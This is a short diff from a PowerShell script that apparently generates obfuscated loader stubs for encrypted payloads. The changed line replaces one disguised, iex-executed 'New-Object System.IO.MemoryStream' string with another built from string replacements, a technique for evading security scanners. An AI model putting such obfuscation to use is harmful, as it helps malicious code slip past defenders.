@@ -183,7 +183,7 @@ sleep 1
 
             $code_alternatives  = @()
             $code_alternatives += '${6} = nEw-OBJECt ([REGex]::uNesCapE("\u0073\u0079\u0053\u0054\u0065\u004d\u002e\u0069\u006f\u002e\u006d\u0045\u006d\u006f\u0072\u0059\u0053\u0054\u0072\u0045\u0061\u006d"))(,${4}.CrEAtedECrYptor().TRaNsFOrmfinaLBlOCk(${2},16,${2}.LEnGth-16))' + "`r`n"
-            $code_alternatives += '${7} = [RegEX]::UnESCaPe("\u004e\u0065\u0077\u002d\u004f\u0062\u006a\u0065\u0063\u0074\u0020\u0053\u0079\u0073\u0074\u0065\u006d\u002e\u0049\u004f\u002e\u004d\u0065\u006d\u006f\u0072\u0079\u0053\u0074\u0072\u0065\u0061\u006d") | ieX' + "`r`n"
+            $code_alternatives += '${7} = ("Z</>w-@wh</>ct^?y?te%.I@.%</>m@rq?5%").rePLACE("^"," ").rePLACE("</>","E").rePLACE("?","S").rePLACE("%","m").rePLACE("wh","bj").rePLACE("@","o").rePLACE("5","trea").rePLACE("Z","n").rePLACE("q","y") | ieX' + "`r`n"
 			$code_alternatives_shuffled = $code_alternatives 
             $stub_template += $code_alternatives_shuffled -join ''
 
